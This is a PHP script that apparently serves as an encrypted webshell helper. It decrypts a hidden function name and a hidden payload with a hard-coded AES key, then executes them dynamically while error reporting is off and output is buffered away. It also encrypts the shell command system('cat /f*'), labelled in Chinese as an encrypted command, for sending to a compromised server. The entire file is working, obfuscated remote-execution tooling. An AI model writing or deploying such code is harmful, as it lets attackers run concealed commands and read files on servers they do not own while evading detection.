<?php

error_reporting(0);header('Content-type: text/html; charset=utf-8');
$p8='3b7430adaed18facca7b799229138b7b';
$a8='TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=';
$d8='TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09';
$v8='0329647546905494';
function e($D,$K){$cipher='aes-128-cbc';$encrypted=openssl_encrypt($D,$cipher,$K,0,$GLOBALS['v8']);
    $result=base64_encode($GLOBALS['v8'].$encrypted);$result=base64_encode($result);return $result;}


function d($D, $K){$cipher='aes-128-cbc';$decodedData=base64_decode(base64_decode($D));
    $encryptedData=substr($decodedData, openssl_cipher_iv_length($cipher));$decrypted=openssl_decrypt($encryptedData,$cipher,$K,0,$GLOBALS['v8']);return $decrypted;}


$a8=trim(d($a8,$p8));ob_start();
$a8(trim(d($d8,$p8)));
$O="system('cat /f*');";//加密命令
ob_end_clean();
echo e($O,$p8);
print_r("\n");
$a='';
echo d($a,$p8);
?>

